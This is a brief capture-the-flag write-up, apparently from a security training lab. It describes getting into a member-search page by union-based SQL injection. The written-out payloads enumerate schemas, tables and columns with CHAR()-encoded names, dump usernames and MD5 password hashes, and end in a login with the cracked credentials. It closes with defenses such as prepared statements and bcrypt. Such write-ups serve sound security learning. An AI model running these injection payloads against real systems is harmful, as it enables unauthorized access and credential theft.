1st method
use SQL Injection && Cryptographic Failures BRUTE FORCE
Process:
    - Go to SEARCH MEMBER BY ID
    - 1 UNION SELECT null, schema_name FROM information_schema.schemata -- 
    - 1 UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema =  CHAR(77,101,109,98,101,114,95,66,114,117,116,101,95,70,111,114,99,101) -- 
    - 1 UNION SELECT null, column_name FROM information_schema.columns WHERE table_name = CHAR(100,98,95,100,101,102,97,117,108,116) --
    - 1 UNION SELECT username, password FROM Member_Brute_Force.db_default -- 
    - Decrypt password with md5
    - Go to signin
    - admin | shadow or root | shadow
    - Get the flag

2nd method
use BruteForce
Process:
    - Use bruteForce.py script


Secure:
    - Use the POST method and not the GET method to send form
   
    - Use prepare request for SQL
    - Check that there is only data and not commands in input for SQL

    - Use a strong password
    - Use Cryptographic tools advanced (bcrypt)
